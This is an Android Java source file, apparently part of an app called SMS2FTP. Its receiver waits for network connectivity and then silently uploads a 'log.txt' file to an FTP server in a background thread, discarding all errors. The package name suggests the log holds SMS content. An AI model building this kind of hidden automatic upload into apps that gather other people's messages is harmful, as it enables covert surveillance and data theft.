package com.n1ck.SMS2FTP;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;

public class NetworkChangeReceiver extends BroadcastReceiver {



    @Override
    public void onReceive(final Context context, final Intent intent) {


        String internet = NetworkUtil.getConnectivityStatusString(context); //Проверяем есть ли инернет


        try {
            Thread.sleep(3000);
        } catch (InterruptedException e) {
        }



        if (internet=="1" || internet=="2"){	//Проверяем активен ли он
            new Thread(new Runnable() {

                @Override
                public void run() {
                    try{
                        //Отправляем файл, если он существует и интернет включен
                        FTPConnect ftp=new FTPConnect();
                        ftp.connectToFTP(context, "log.txt");
                    }catch(Exception e) {

                    }
                }
            }).start();
        }}
}
